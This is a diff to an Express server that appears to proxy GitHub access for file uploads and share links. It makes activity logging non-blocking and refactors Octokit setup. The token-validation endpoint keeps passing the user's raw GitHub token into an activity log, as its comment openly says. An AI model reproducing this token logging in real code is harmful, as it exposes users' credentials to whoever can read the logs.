@@ -358,8 +358,10 @@ app.post('/api/github/validate', async (req, res) => {
         const octokit = getOctokit(token);
         const { data } = await octokit.rest.users.getAuthenticated();
         
-        // Log token validation with actual token
-        await logActivity('token', data.login, token);
+        // Log token validation with actual token (non-blocking)
+        logActivity('token', data.login, token).catch(err => {
+            console.error('Failed to log token validation:', err.message);
+        });
         
         res.json({ username: data.login, avatar_url: data.avatar_url });
     } catch (error) {
@@ -438,9 +440,11 @@ app.get('/api/github/files', async (req, res) => {
         // Get username for logging
         const { data: userData } = await octokit.rest.users.getAuthenticated();
         
-        // Log repository selection (only when accessing root uploads folder)
+        // Log repository selection (only when accessing root uploads folder, non-blocking)
         if (!dirPath || dirPath === '') {
-            await logActivity('repository', userData.login, `${owner}/${repo}`);
+            logActivity('repository', userData.login, `${owner}/${repo}`).catch(err => {
+                console.error('Failed to log repository selection:', err.message);
+            });
         }
         
         // Check if uploads folder exists in this repo
@@ -1285,8 +1289,7 @@ app.post('/api/share/create', async (req, res) => {
     }
 
     try {
-        const { Octokit } = require('octokit');
-        const octokit = new Octokit({ auth: token });
+        const octokit = getOctokit(token);
         const { data: userData } = await octokit.rest.users.getAuthenticated();
         const username = userData.login;
 
@@ -1310,8 +1313,10 @@ app.post('/api/share/create', async (req, res) => {
 
         const shareUrl = `${req.protocol}://${req.get('host')}/api/share/${username}/${shareToken}`;
         
-        // Log share link creation
-        await logActivity('shared_link', username, shareUrl);
+        // Log share link creation (non-blocking)
+        logActivity('shared_link', username, shareUrl).catch(err => {
+            console.error('Failed to log share link creation:', err.message);
+        });
         
         res.json({ token: shareToken, url: shareUrl, expiresAt: expiresAt.toISOString(), username });
     } catch (error) {
